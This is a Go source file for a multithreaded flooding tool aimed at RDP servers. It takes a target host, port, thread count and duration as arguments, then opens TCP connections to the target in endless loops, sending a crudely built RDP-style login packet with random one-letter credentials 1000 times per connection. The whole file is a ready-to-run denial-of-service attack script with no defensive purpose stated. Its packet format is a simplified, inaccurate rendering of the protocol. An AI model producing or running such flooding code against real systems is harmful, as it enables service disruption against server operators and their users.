package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"time"
)

var (
	host  = ""
	port  = ""
	abcd  = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
	start = make(chan bool)
)

func Construct_LoginPacket(aaaa string, bbbb string, cccc string) []byte {
	// Construct RDP login packet
	username := aaaa
	password := bbbb
	domain := cccc

	// Header
	header := []byte{0x03, 0x00, 0x00, 0x13, 0x0E, 0xE0, 0x00, 0x00}

	// X.224 Data - Connection Request PDU
	// Constructing a simple connection request PDU
	// Protocol version: 0x00080005
	// Requested protocols: 0x00000001 (RDP)
	// Security mechanisms: 0x00000001 (SSL)
	x224Data := []byte{
		0x03, 0x00, 0x00, 0x11, // Length
		0x0E, 0xE0, 0x00, 0x00, // Type
		0x00, 0x00, 0x00, 0x05, // Protocol version
		0x00, 0x00, 0x08, 0x00,
		0x00, 0x00, 0x00, 0x01, // Requested protocols
		0x00, 0x00, 0x00, 0x01, // Security mechanisms
	}

	// Credentials
	// Encode the username, password, and domain
	// This is a simplified example and does not include encoding schemes like UTF-16LE
	// The actual encoding depends on the RDP protocol version and negotiation
	// Here, we just concatenate the strings with null terminators
	credentials := []byte(username + "\x00" + password + "\x00" + domain + "\x00")

	// Concatenate all parts to form the login packet
	loginPacket := append(header, x224Data...)
	loginPacket = append(loginPacket, credentials...)
	return loginPacket
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func flood() {
	addr := host + ":" + port
	peket := Construct_LoginPacket(string(abcd[rand.Intn(len(abcd))]), string(abcd[rand.Intn(len(abcd))]), string(abcd[rand.Intn(len(abcd))]))
	var s net.Conn
	var err error
	<-start
	for {
		s, err = net.Dial("tcp", addr)
		if err != nil {
			// fmt.Println("Error:", err)
		} else {
			for i := 0; i < 1000; i++ {
				s.Write(peket)
			}
			s.Close()
		}
	}
}

func main() {
	// Yayaya suki
	host = os.Args[1]
	port = os.Args[2]
	thr, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Threads should be a integer")
	}
	dura, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("duration should be a integer")
	}
	for i := 0; i < thr; i++ {
		time.Sleep(time.Microsecond * 100)
		go flood() // Start threads
		//fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
	}
	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
	close(start)
	time.Sleep(time.Duration(dura) * time.Second)
}
